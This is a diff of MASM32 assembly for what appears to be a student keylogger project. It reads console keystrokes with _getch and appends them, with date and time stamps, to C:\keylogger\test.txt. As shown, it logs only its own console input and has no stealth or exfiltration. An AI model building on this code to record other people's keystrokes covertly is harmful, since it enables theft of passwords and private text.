@@ -1,18 +1,21 @@
 .386 
-.model flat,stdcall 
+.model flat, stdcall 
 option casemap:none 
+; includes
 include \masm32\include\windows.inc 
-include \masm32\include\user32.inc 
-includelib \masm32\lib\user32.lib
+;include \masm32\include\user32.inc 
 include \masm32\include\kernel32.inc 
 include \masm32\include\masm32.inc
+include \masm32\include\masm32rt.inc ; contiene la fecha
+;librerias
 includelib \masm32\lib\masm32.lib
 includelib \masm32\lib\kernel32.lib
+;includelib \masm32\lib\user32.lib
 
 .DATA
-formatofecha db " dd, MM, yyyy",0
-formatohora db " hh:mm:ss",0
-FileName db "C:\keylogger\test.txt",NULL
+formatofecha db "dd/MM/yyyy",0
+formatohora db "hh:mm:ss",0
+FileName db "C:\keylogger\test.txt", NULL
 espacio db ' ',0
 cr db 0dh
 lf db 0ah
@@ -22,33 +25,36 @@ bytesRHora dd 9
 BytesWritten dd 1
 bytesWFecha dd 13
 bytesWHora dd 9
-szReadBuffer db "PROYECTO 2 MICROPROGRAMACIONh"
-string db ?
-result dword 0 
 .DATA?
+string dd ?
 fechabuf db 50 dup(?)
 horabuf db 50 dup(?)
 hFile HANDLE ?
 hReadFrom dd ?
 hWriteTo dd ?
-keyBoard byte 256 DUP(?)
 
 .CODE
-start: 
+
+program: 
+MAIN proc 
+
     invoke CreateFile,addr FileName,GENERIC_READ OR GENERIC_WRITE,FILE_SHARE_READ OR FILE_SHARE_WRITE, NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL ; llamada al API PARA CREAR/ABRIR EL ARCHIVO
     mov hFile,eax
     cmp hFile, INVALID_HANDLE_VALUE ; compara el handle generado con 0 para ver si fue correcto o no
     jz code1 ; fue incorrecto salta a code1, sino muestra un messageBox 
-	
+
 	; CICLO PARA LEER ENTRADAS DEL TECLADO
 	readKeyBoard:
-	invoke StdIn, addr string, 1
-	mov al, string	; la entrada va al registro "al"
-	cmp al, 20h	;comparar con ' ' 
+	;invoke StdIn, addr string, 1
+	;mov al, string	; la entrada va al registro "al"
+	call crt__getch
+	mov string, eax 
+	; COMPARACIONES
+	cmp eax, 20h	;comparar con ' ' 
 	je hour
-	cmp al, 0ah	;comparar con enter
+	cmp eax, 0dh	;comparar con enter
 	je hour
-	jmp readAgain						;de lo contrario, sigue leyendo teclado
+	jmp readAgain ;de lo contrario, sigue leyendo teclado
 
 	hour:
 		call getHour
@@ -57,13 +63,15 @@ start:
 	readAgain:	
 		Invoke WriteFile, hFile, Addr string, BytesRead, Addr BytesWritten, NULL	; llamada al API para escribir en el archivo 	
 		jmp readKeyBoard
-        
 
 
 
-code1:
-    invoke ExitProcess,0
-   
+
+	code1:
+	invoke ExitProcess,0
+
+MAIN endp
+
 
 getHour proc 
 	invoke GetDateFormat, 0, 0,\
@@ -84,4 +92,4 @@ getHour proc
 	ret
 getHour endp 
 
-end start
+END program
